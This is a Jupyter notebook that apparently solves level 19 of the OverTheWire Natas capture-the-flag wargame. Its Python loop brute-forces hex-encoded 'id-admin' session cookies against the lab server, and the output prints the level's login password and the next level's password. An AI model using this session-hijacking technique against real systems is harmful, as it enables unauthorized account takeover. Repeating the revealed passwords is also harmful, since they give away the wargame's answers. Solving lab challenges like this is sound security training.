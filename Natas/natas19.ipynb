{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1097\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas19\", \"pass\": \"8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s\" };</script></head>\n",
      "<body>\n",
      "<h1>natas19</h1>\n",
      "<div id=\"content\">\n",
      "<p>\n",
      "<b>\n",
      "This page uses mostly the same code as the previous level, but session IDs are no longer sequential...\n",
      "</b>\n",
      "</p>\n",
      "DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas20\n",
      "Password: guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH</pre></div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "testing session id 281, key: 3238312d61646d696e\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "from IPython.display import clear_output\n",
    "\n",
    "url = f'http://natas19.natas.labs.overthewire.org/index.php?debug=1&username=admin&password=test'\n",
    "for i in range(281, 641):\n",
    "    key = f'{i}-admin'.encode('utf-8').hex()\n",
    "    cookies = dict(PHPSESSID=key)\n",
    "    result = requests.get(url, auth=(\"natas19\", \"8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s\"), cookies=cookies)\n",
    "    if 'Username: natas20' in result.text:\n",
    "        clear_output()\n",
    "        print(len(result.text))\n",
    "        print(result.text)\n",
    "        print(f'testing session id {i}, key: {key}')\n",
    "        break\n",
    "    print(f'testing session id {i}, key: {key}')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
